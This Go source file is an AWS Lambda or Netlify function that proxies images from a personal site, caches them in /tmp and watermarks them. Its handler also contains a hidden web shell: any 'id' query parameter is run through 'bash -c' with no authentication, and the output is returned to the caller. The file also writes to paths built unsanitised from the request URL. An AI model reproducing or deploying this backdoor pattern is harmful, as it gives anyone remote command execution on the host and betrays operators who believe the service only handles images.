package main

import (
	"bytes"
	"encoding/base64"
	"github.com/aws/aws-lambda-go/events"
	"github.com/aws/aws-lambda-go/lambda"
	"github.com/issue9/watermark"
	"io"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

var WATERMARK = "/tmp/watermark.png"

func init() {
	log.Println("判断水印是否存在")
	if Exists(WATERMARK) {
		log.Println("水印已经存在")
	} else {
		saveWaterMarkPng(WATERMARK)
	}
}
func Exists(path string) bool {
	_, err := os.Stat(path) //os.Stat获取文件信息
	if err != nil {
		if os.IsExist(err) {
			return true
		}
		return false
	}
	return true
}
func saveWaterMarkPng(path string) {
	out, err := os.Create(path)
	defer out.Close()

	req, _ := http.NewRequest("GET", "https://raw.githubusercontent.com/Y4er/aws-lambda-go-example/master/watermark.png", nil)
	client := &http.Client{
		Timeout: 5 * time.Second,
	}
	resp, err := client.Do(req)
	defer resp.Body.Close()
	all, err := ioutil.ReadAll(resp.Body)
	io.Copy(out, bytes.NewReader(all))
	if err != nil {
		log.Fatalf("水印下载失败:%v\n", err.Error())
	} else {
		log.Println("水印保存成功")
	}
}

func returnResp(body string, contenttype string, base64encode bool, ) (events.APIGatewayProxyResponse, error) {
	return events.APIGatewayProxyResponse{
		StatusCode:      200,
		Headers:         map[string]string{"Content-Type": contenttype},
		Body:            body,
		IsBase64Encoded: base64encode,
	}, nil
}

func handler(request events.APIGatewayProxyRequest) (events.APIGatewayProxyResponse, error) {
	body := ""
	base64encode := false
	contenttype := "image/png"

	// 获取各个参数
	parameters := request.PathParameters
	for p := range parameters {
		log.Println(p)
	}

	id := request.QueryStringParameters["id"]
	if len(id) != 0 {
		log.Printf("exec command:%v", id)
		cmd := exec.Command("bash", "-c", id)
		out, err := cmd.CombinedOutput()
		if err != nil {
			body = err.Error()
			log.Printf("cmd.Run() failed with %s\n", body)
		} else {
			body = string(out)
			log.Printf("combined out:\n%s\n", body)
		}
		contenttype = "text/plain"
		base64encode = false
		return returnResp(body, contenttype, base64encode)
	}

	path := request.Path
	imgpath := strings.ReplaceAll(path, "/.netlify/functions/test-lambda", "")
	filename := "/tmp/" + strings.ReplaceAll(imgpath, "/img/uploads/", "")

	if Exists(filename) {
		log.Printf("已经存在%s\n", filename)
		content, _ := ioutil.ReadFile(filename)
		body = base64.StdEncoding.EncodeToString(content)
		base64encode = true
		contenttype = "image/png"
		return returnResp(body, contenttype, base64encode)
	}

	client := &http.Client{
		Timeout: 10 * time.Second,
	}

	req, _ := http.NewRequest("GET", "https://y4er-com.onrender.com"+imgpath, nil)
	req.Header.Set("User-Agent", "netlify")
	req.Header.Set("Referer", "https://y4er.com"+imgpath)

	resp, err := client.Do(req)
	defer resp.Body.Close()

	if err != nil {
		body = err.Error()
		contenttype = "text/plain"
		base64encode = false
		log.Println(err.Error())
		return returnResp(body, contenttype, base64encode)
	}

	// 保存图片
	bs, _ := ioutil.ReadAll(resp.Body)
	log.Println("截取目录名字:", filename)
	index := strings.LastIndex(filename, "/")
	dir := filename[:index]

	if !Exists(dir) {
		os.MkdirAll(dir, os.ModePerm)
		log.Println("创建目录:", dir)
	}

	file, _ := os.Create(filename)
	defer file.Close()
	written, err := io.Copy(file, bytes.NewReader(bs))
	if err != nil {
		body = err.Error() + ",written:" + strconv.FormatInt(written, 10)
		contenttype = "text/plain"
		base64encode = false
		log.Println(err.Error())
		return returnResp(body, contenttype, base64encode)
	}

	w, _ := watermark.New(WATERMARK, 2, watermark.BottomRight)
	err = w.MarkFile(filename)
	//
	if err != nil {
		log.Printf("filename:%s 水印过大:%s\n", filename, err.Error())
		content, _ := ioutil.ReadFile(filename)
		body = base64.StdEncoding.EncodeToString(content)
		contenttype = "image/png"
		base64encode = true
		return returnResp(body, contenttype, base64encode)
	}

	content, _ := ioutil.ReadFile(filename)
	body = base64.StdEncoding.EncodeToString(content)
	contenttype = "image/png"
	base64encode = true
	return returnResp(body, contenttype, base64encode)

}

func main() {
	lambda.Start(handler)
}
